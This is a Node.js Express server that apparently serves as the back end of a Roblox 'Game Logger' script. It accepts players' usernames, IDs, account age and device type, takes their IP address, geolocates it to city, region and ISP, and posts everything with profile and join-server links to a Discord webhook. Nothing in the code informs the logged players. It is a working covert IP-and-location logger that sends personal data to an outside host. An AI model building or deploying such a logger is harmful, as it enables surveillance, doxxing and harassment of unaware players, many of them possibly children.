const express = require("express");
const axios = require("axios");

const app = express();
app.use(express.json());

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
const PORT = process.env.PORT || 3000;

function getTimestamp() {
    return new Date().toISOString();
}

function formatDate(accountAge) {
    const ms = Date.now() - accountAge * 86400 * 1000;
    return new Date(ms).toISOString().split("T")[0];
}

app.post("/log", async (req, res) => {
    const {
        username,
        displayName,
        userId,
        accountAge,
        gameName,
        placeId,
        jobId,
        deviceType,
        serverKey
    } = req.body;

    if (serverKey !== "RAHASIA_KAMU") {
        return res.status(403).json({ error: "Unauthorized" });
    }

    const clientIp =
        req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
        req.socket.remoteAddress;

    let ipInfo = {
        ip: clientIp,
        city: "Unknown",
        regionName: "Unknown",
        country: "Unknown",
        isp: "Unknown"
    };

    try {
        const geoRes = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,city,regionName,country,isp,query`);
        if (geoRes.data.status === "success") {
            ipInfo = geoRes.data;
        }
    } catch {}

    const location = `${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}`;
    const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
    const gameUrl = `https://www.roblox.com/games/${placeId}`;
    const createdDate = formatDate(accountAge);

    const payload = {
        username: "Game Logger",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/906/906343.png",
        embeds: [
            {
                title: `🛰️ SCRIPT BY BRIELLPRSTT`,
                color: 15158332,
                fields: [
                    {
                        name: "👤 USER INFORMATION",
                        value: [
                            "```",
                            `Username      : ${username}`,
                            `Display Name  : ${displayName}`,
                            `User ID       : ${userId}`,
                            `Account Age   : ${accountAge} Days`,
                            `Account Created: ${createdDate}`,
                            `Device Type   : ${deviceType}`,
                            "```"
                        ].join("\n"),
                        inline: false
                    },
                    {
                        name: "🌐 NETWORK INFORMATION",
                        value: [
                            "```",
                            `IP Address : || ${ipInfo.ip} ||`,
                            `Location   : ${location}`,
                            `ISP        : ${ipInfo.isp}`,
                            "```"
                        ].join("\n"),
                        inline: false
                    },
                    {
                        name: "🎮 GAME INFORMATION",
                        value: [
                            "```",
                            `Game Name : ${gameName}`,
                            `Place ID  : ${placeId}`,
                            `Job ID    : ${jobId}`,
                            "```"
                        ].join("\n"),
                        inline: false
                    },
                    {
                        name: "🔗 QUICK LINKS",
                        value: `[Click to Cek Profile](${profileUrl})  |  [Click to Join Game](${gameUrl})`,
                        inline: false
                    },
                    {
                        name: "🔧 APPLICATION INFO",
                        value: "```\nApplication : Roblox\n```",
                        inline: false
                    }
                ],
                footer: {
                    text: `Script: BRIELLPRSTT | ${new Date().toLocaleString("en-US")}`
                },
                timestamp: getTimestamp()
            }
        ]
    };

    try {
        await axios.post(DISCORD_WEBHOOK, payload, {
            headers: { "Content-Type": "application/json" }
        });
        return res.status(200).json({ status: "sent" });
    } catch (err) {
        return res.status(500).json({ error: "Failed to send webhook" });
    }
});

app.listen(PORT, () => {
    console.log(`Server berjalan di port ${PORT}`);
});